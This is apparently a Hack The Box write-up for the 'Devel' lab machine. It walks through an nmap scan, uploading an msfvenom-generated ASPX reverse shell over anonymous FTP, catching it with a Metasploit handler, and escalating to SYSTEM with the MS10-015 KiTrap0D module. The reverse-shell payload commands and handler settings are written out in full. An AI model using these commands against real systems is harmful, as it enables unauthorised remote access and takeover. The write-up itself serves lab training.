

#############################################
					Cosmin Tibuleac | 28.10.2021
#############################################

https://app.hackthebox.com/machines/3


# Nmap 7.91 scan initiated Thu Oct 28 10:24:28 2021 as: nmap -A -T4 -p- -o nmap.txt 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.049s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   48.63 ms 10.10.14.1
2   48.74 ms 10.10.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 28 10:26:18 2021 -- 1 IP address (1 host up) scanned in 110.74 seconds
	
Since we are allowed to upload files anonymously on the FTP server, maybe we could upload a .ASP reverse shell and then access it via HTTP.
	
We can try to generate the shell with msfvenom like this: 
	
		**msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=6666 -f aspx > shell2.aspx**
	
This is one option, but we can also use the meterpreter version, which will allow us to use Metasploit's meterpreter:
	
**msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=6666 -f aspx >reverse.aspx**
	
Now, we can login into the FTP server with the following credentials:
	
user: anonymous
	
password: 

(leave the password blank)

Once logged in, we can use the command "put" to upload our meterpreter reverse shell onto the server:
	

![[Pasted image 20211030020910.png]]
	
Now, it's time to start a listener using msfconsole (because we want a meterpreter):
	
**msf6 > use exploit/multi/handler**

use "show options" and then set our listening interface and port:
	
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.15
msf6 exploit(multi/handler) > set LPORT 6666
LPORT => 6666
msf6 exploit(multi/handler) > 

We also need to set the following payload:
	
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
	
Now, after we run it, we just need to go to our victim website and execute the .aspx script we put: 10.10.10.5/reverse.aspx
	
And we're in! 
	
![[Pasted image 20211030021756.png]]
	
	
It looks like we are in, but not as AUTHORITY SYSTEM, so we will need to find a way to escalate our privileges:
	
	**meterpreter > getuid
Server username: IIS APPPOOL\Web**
	
The way we can approach this, is by getting the system info and then use a local tool on our attacking machine, called "Windows-Exploit-Suggester":
	
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
	
Credits to AonCyberLabs for this awesome tool!
	
Let's begin;
First, we will need to use "systeminfo" on the victim machine, and we will get this: 
	
	*Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          1/11/2021, 10:05:46 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.481 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.555 MB
Virtual Memory: In Use:    586 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::3c*
	

We need to copy this, and create a .txt file on our machine, so we can feed it to Windows-Exploit-Suggster.
	
After creating the .txt file, we first need to run --update like this: 
	
**./windows-exploit-suggester.py --update**
	
Afterwards, it's time to run the script:
	
**./windows-exploit-suggester.py --database 2021-11-01-mssb.xls --systeminfo systeminfo.txt**
	
	
![[Pasted image 20211101042113.png]]
	
These vulnerabilities, are trial and error. We need to try a few and see what sticks, if any.
	
I have found that the one exploit that works is the following:
	
**MS10-015 - exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D**
	
We need to set it the LHOST and LPORT and assign it our meterpreter session.
	
Then, we can just run it.

	
Victory! 
	
**meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM**
	
